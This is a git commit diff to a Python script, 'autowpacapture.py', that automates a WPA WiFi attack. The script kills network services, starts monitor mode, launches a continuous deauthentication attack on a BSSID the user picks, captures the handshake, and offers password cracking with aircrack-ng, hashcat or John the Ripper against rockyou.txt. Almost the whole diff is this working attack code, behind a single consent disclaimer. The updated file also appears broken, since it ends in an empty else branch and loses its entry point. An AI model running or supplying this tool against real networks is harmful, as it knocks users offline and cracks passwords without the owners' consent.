ba30319519139378952d400f5c7fbfa5f35c27fa
Zeyaad <148540407+zeyaadplaysgames@users.noreply.github.com>
2024-07-25 17:19:36 +0400

    Update autowpacapture.py
    made some better input handling, removed some unecessary functions

--- autowpacapture.py
+++ autowpacapture.py
@@ -11,28 +11,14 @@ def check_handshake(pcap_file):
     result = subprocess.run(['tshark', '-r', pcap_file, '-Y', 'eapol'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     return 'EAPOL' in result.stdout.decode()
 
-def crack_with_aircrack(pcap_file, bssid, wordlist):
-    subprocess.run(['aircrack-ng', '-w', wordlist, '-b', bssid, pcap_file])
-
-def convert_to_hashcat_format(pcap_file, outfile):
-    subprocess.run(['hcxpcapngtool', '-o', outfile, pcap_file])
-
-def crack_with_hashcat(hash_file, wordlist):
-    subprocess.run(['hashcat', '-m' , '22000' '-a', '0', hash_file, wordlist])
-
-def crack_with_john(pcap_file, wordlist):
-    subprocess.run(['john', '--wordlist=' + wordlist, pcap_file])
-
 def install_package(package):
-    """Install a package using apt-get (for Debian-based systems). Modify as needed."""
-    try:
-        subprocess.run(['apt-get', 'install', package], check=True)
+     try:
+        subprocess.run(['apt-get', 'install', '-y', package], check=True)
     except subprocess.CalledProcessError as e:
         print(f'Error installing {package}: {e}')
         sys.exit(1)
 
 def check_program_installed(program):
-    """Check if a program is installed on the system. Install if missing."""
     try:
         subprocess.run(['which', program], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
         return True
@@ -49,13 +35,22 @@ def check_program_installed(program):
 
 def print_menu():
     print("""
-
+Choose a cracking method:
     [1] Crack with aircrack-ng
     [2] Crack with hashcat
     [3] Crack with john the ripper
     [4] Skip cracking
     [5] Exit
     """)
+
+def get_valid_interface():
+    while True:
+        interface = input('\nEnter the interface to use with airmon-ng: ')
+        result = subprocess.run(['iwconfig', interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        if b"no such device" not in result.stderr.lower():
+            return interface
+        else:
+            print('Invalid interface. Please enter a valid network interface.')
 
 def main():
     # Check required programs
@@ -66,23 +61,28 @@ def main():
             sys.exit(1)
 
     if uid != 0:
-        print('You must be \033[91m\033[1mroot\033[0m to run this script.')
+        print('You must be root to run this script.')
         sys.exit(1)
 
     subprocess.run(['clear'])
     # Clear the terminal from any mess
-    print("Caution! This script holds mighty power, especially since hacking without consent is illegal.\nBy using this script, you agree that you are using it for Legal/ethical/Educational purposes and with consent from the person you're attacking.")
-    maybe = input('Running this script requires you to shut down some network services. You will not be able to connect to the internet.\n\nProceed? (y/n) ')
-
-    if maybe.lower() != 'y':
-        print('mkay, exiting')
-        sys.exit(0)
+    print("By using this script, you agree that you are using it for Legal/ethical/Educational purposes and with consent from the person you're attacking.")
+    
+    while True:
+        maybe = input('Running this script requires you to shut down some network services. You will not be able to connect to the internet.\n\nProceed? (y/n):')
+        if maybe.lower() == 'y':
+            break
+        elif maybe.lower() == 'n':
+            print('Exiting...')
+            sys.exit(0)
+        else:
+            print('Invalid option. Please enter y or n.')
 
     print('\nKilling all conflicting processes...')
     subprocess.run(['airmon-ng', 'check', 'kill'])
     subprocess.run(['iwconfig'])
 
-    interface = input('\nWhich interface do you want airmon-ng to run on? ')
+    interface = get_valid_interface()
     print('\nStarting up Airmon-ng...')
     subprocess.run(['airmon-ng', 'start', interface])
 
@@ -94,15 +94,14 @@ def main():
     except KeyboardInterrupt:
         pass
 
-    bssid = input('\nWhich BSSID would you like to attack? ')
-    channel = input('\nWhich channel is it running on? ')
-    outfile = input('What do you want to call the output file? ')
+    bssid = input('\nEnter the BSSID you would like to attack: ')
+    channel = input('Enter the channel it is running on: ')
+    outfile = input('Enter the name for the output file: ')
 
-    print('Running a deauth attack on', bssid, 'channel', channel, '...')
+    print(f'Running a deauth attack on {bssid} channel {channel}...')
     time.sleep(2)
-    # airodump-ng -c 8 --bssid [yes] wlan0
-    pcap_file = outfile + '-01.cap'
-    airodump_process = subprocess.Popen(['airodump-ng', '-c', channel, '--bssid', bssid, '-w', outfile, interface])
+    pcap_file = f'/tmp/{outfile}-01.cap'
+    airodump_process = subprocess.Popen(['airodump-ng', '-c', channel, '--bssid', bssid, '-w', f'/tmp/{outfile}', interface])
     subprocess.Popen(['aireplay-ng', '--deauth', '0', '-a', bssid, interface])
 
     print('\nPress Ctrl+C when ready to stop airodump-ng and check for handshake...')
@@ -115,37 +114,39 @@ def main():
     time.sleep(5)  # Give some time for the deauth attack to capture the handshake
 
     if check_handshake(pcap_file):
-        print('Handshake detected! Do you want to crack the password? (y/n)')
-        crack = input()
-        if crack.lower() == 'y':
-            wordlist = input('Enter the path to your wordlist (leave empty to use rockyou.txt): ')
-            if not wordlist:
-                wordlist = '/usr/share/wordlists/rockyou.txt'
-            
-            print_menu()
-            choice = input('Choice: ')
+        while True:
+            print('Handshake detected! Do you want to crack the password? (y/n)')
+            crack = input()
+            if crack.lower() == 'y':
+                wordlist = input('Enter the path to your wordlist (leave empty to use rockyou.txt): ')
+                if not wordlist:
+                    wordlist = '/usr/share/wordlists/rockyou.txt'
 
-            if choice == '1':
-                crack_with_aircrack(pcap_file, bssid, wordlist)
-            elif choice == '2':
-                hash_file = outfile + '.hc22000'
-                convert_to_hashcat_format(pcap_file, hash_file)
-                crack_with_hashcat(hash_file, wordlist)
-            elif choice == '3':
-                crack_with_john(pcap_file, wordlist)
-            elif choice == '4':
+                while True:
+                    print_menu()
+                    choice = input('Choice: ')
+
+                    if choice == '1':
+                        subprocess.run(['aircrack-ng', '-w', wordlist, '-b', bssid, pcap_file])
+                        break
+                    elif choice == '2':
+                        hash_file = f'/tmp/{outfile}.hc22000'
+                        subprocess.run(['hcxpcapngtool', '-o', hash_file, pcap_file])
+                        subprocess.run(['hashcat', '-m', '22000', '-a', '0', hash_file, wordlist])
+                        break
+                    elif choice == '3':
+                        subprocess.run(['john', '--wordlist=' + wordlist, pcap_file])
+                        break
+                    elif choice == '4':
+                        print('Skipping password cracking.')
+                        break
+                    elif choice == '5':
+                        print('Exiting...')
+                        sys.exit(0)
+                    else:
+                        print('Invalid choice, please try again.')
+            elif crack.lower() == 'n':
                 print('Skipping password cracking.')
-            elif choice == '5':
-                print('Exiting...')
-                sys.exit(0)
+                break
             else:
-                print('Invalid choice, skipping password cracking.')
-        else:
-            print('Skipping password cracking.')
-    else:
-        print('No handshake detected.')
-
-if __name__ == '__main__':
-    main()
-
-# Tasneem will you marry me? 
+                
